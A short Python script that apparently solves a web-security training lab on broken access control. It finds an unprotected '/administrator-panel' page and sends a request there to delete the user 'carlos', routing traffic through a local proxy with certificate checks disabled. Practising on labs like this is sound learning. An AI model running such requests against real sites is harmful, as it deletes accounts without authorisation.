# Broken Access Control

import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# config proxcy
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}


def delete_user(url):
    admin_panel_url = url + '/administrator-panel'
    r = requests.get(admin_panel_url, proxies=proxies, verify=False  )
    if r.status_code == 200:
        print('[+] found the administrator panel!')
        print('[+] Deleting target user...')
        delete_target_user = admin_panel_url + '/delete?username=carlos'
        r = requests.get(delete_target_user,proxies=proxies,verify=False)
        if r.status_code == 200:
            print('Carlos user deleted!')
        else:
            print('(-) could not delete user.')
    else:
        print('(-) Administorator panel not found')
        print('(-) Exiting the script...')

def main():
    if len(sys.argv) != 2 :
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] finding admin panel....")
    delete_user(url)


if __name__ == "__main__":
    main()